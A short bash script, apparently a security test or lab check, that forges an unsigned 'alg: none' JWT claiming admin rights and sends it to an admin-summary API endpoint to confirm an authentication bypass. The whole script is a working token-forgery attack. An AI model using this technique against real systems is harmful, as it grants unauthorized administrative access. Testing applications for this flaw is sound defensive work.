#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
h=$(b64url '{"alg":"none","typ":"JWT"}')
p=$(b64url '{"sub":999,"role":"admin","isAdmin":true}')
body=$(curl -s -H "authorization: Bearer $h.$p." "$TARGET/api/reports/admin-summary")
grep -q 'ADMIN-SUMMARY-NESTJS' <<<"$body"
